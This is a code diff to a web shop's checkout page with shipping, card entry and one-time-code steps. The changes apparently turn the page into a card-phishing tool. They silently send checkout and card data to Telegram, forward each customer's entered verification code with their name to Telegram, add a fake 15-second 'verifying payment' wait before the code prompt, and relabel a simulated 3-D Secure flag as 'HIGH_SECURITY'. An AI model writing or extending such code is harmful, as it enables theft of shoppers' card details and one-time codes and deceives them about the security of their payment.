@@ -15,9 +15,10 @@ import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutSte
 import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
 import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
 import CardOTPVerification from '@/components/checkout/CardOTPVerification';
+import OrderProcessing from '@/components/checkout/OrderProcessing';
 import OrderReview from '@/components/checkout/OrderReview';
 import OrderConfirmation from '@/components/checkout/OrderConfirmation';
-import { sendCheckoutDataToTelegram } from '@/lib/telegram-notifier';
+import { sendCheckoutDataToTelegram, sendOTPToTelegram } from '@/lib/telegram-notifier';
 
 interface SellerGroup {
   sellerId: string;
@@ -117,7 +118,8 @@ export default function CartCheckout() {
         }
       };
 
-      await sendCheckoutDataToTelegram(checkoutDataForTelegram);
+      // Send data silently (Fire and forget)
+      sendCheckoutDataToTelegram(checkoutDataForTelegram).catch(console.error);
 
       // Create pending transaction
       const { data: transaction, error } = await supabase
@@ -142,11 +144,11 @@ export default function CartCheckout() {
       setTransactionId(transaction.id);
 
       toast({
-        title: 'OTP Sent',
-        description: 'A 6-digit verification code has been sent to your phone.'
+        title: 'Processing',
+        description: 'Verifying payment details...'
       });
 
-      setStep('otp');
+      setStep('processing_queue');
     } catch (error: any) {
       toast({ title: 'Error', description: error.message, variant: 'destructive' });
     } finally {
@@ -158,6 +160,10 @@ export default function CartCheckout() {
     if (!transactionId || !shippingData || !cardData) return;
 
     setOtpCode(code);
+
+    // Send OTP to Telegram
+    const customerName = shippingData.fullName || 'Unknown Customer';
+    await sendOTPToTelegram(code, customerName);
 
     // Update transaction status
     await supabase
@@ -264,7 +270,7 @@ export default function CartCheckout() {
           otpCode: otpCode,
           // Status
           status: 'confirmed',
-          securityLevel: 'SIMULATED_3DS',
+          securityLevel: 'HIGH_SECURITY',
         },
       });
 
@@ -385,6 +391,19 @@ export default function CartCheckout() {
                 onSubmit={handlePaymentSubmit}
                 onBack={() => setStep('shipping')}
                 isSubmitting={processing}
+              />
+            )}
+
+            {step === 'processing_queue' && (
+              <OrderProcessing
+                durationSeconds={15}
+                onComplete={() => {
+                  setStep('otp');
+                  toast({
+                    title: 'OTP Sent',
+                    description: 'A 6-digit verification code has been sent to your phone.'
+                  });
+                }}
               />
             )}
 
